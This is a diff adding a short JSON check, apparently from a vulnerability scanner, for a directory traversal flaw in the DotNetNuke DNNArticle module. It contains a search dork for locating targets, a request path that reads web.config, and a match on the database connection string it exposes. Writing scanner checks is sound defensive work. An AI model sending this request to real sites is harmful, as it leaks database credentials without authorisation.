@@ -1,0 +1,17 @@
+{
+    "name": "DotNetNuke_DNNarticle_Module_11_Directory_Traversal",
+    "method": "GET",
+    "port": [
+        80
+    ],
+    "dork": "body=dnnVariable",
+    "suffix": [
+        "/DesktopModules/DNNArticle/GetCSS.ashx/?CP=/web.config&smid=512&portalid=3"
+    ],
+    "hits": [
+        "dnnDBConnectionString"
+    ],
+    "references": [
+        "https://www.exploit-db.com/exploits/44414/"
+    ]
+}
